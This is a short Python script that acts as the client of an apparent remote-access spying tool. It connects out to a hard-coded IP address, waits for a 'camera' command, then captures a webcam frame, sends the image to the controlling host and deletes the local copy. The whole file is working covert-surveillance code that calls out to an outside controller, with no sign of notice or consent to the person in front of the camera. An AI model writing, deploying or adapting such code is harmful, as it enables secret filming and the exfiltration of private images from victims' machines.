import socket 
import os 
import cv2

def take_pctr(conn):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            conn.send(b"ERROR: Camera not available")
            return
            
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            conn.send(b"ERROR: Failed to capture image")
            return
            
        cv2.imwrite("pctr.jpg", frame)
        
        if not os.path.exists("pctr.jpg"):
            conn.send(b"ERROR: Failed to save image")
            return
            
        size = os.path.getsize("pctr.jpg")
        conn.send(f"{size:<16}".encode())
        
        with open("pctr.jpg", "rb") as f:
            conn.sendall(f.read())
            
        os.remove("pctr.jpg") 
        
    except Exception as e:
        conn.send(f"ERROR: {str(e)}".encode())

def main():
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(10)  
        conn.connect(("10.91.89.185", 5000))  # match server
        
        while True:
            try:
                cmd = conn.recv(1024).decode().strip()
                if not cmd:  
                    break
                    
                if cmd == "camera":
                    take_pctr(conn)
                elif cmd == "exit":
                    break
                    
            except socket.timeout:
                break
            except Exception as e:
                print(f"Error: {e}")
                break
                
    except Exception as e:
        print(f"Connection failed: {e}")
    finally:
        conn.close()

if __name__ == "__main__":
    main()
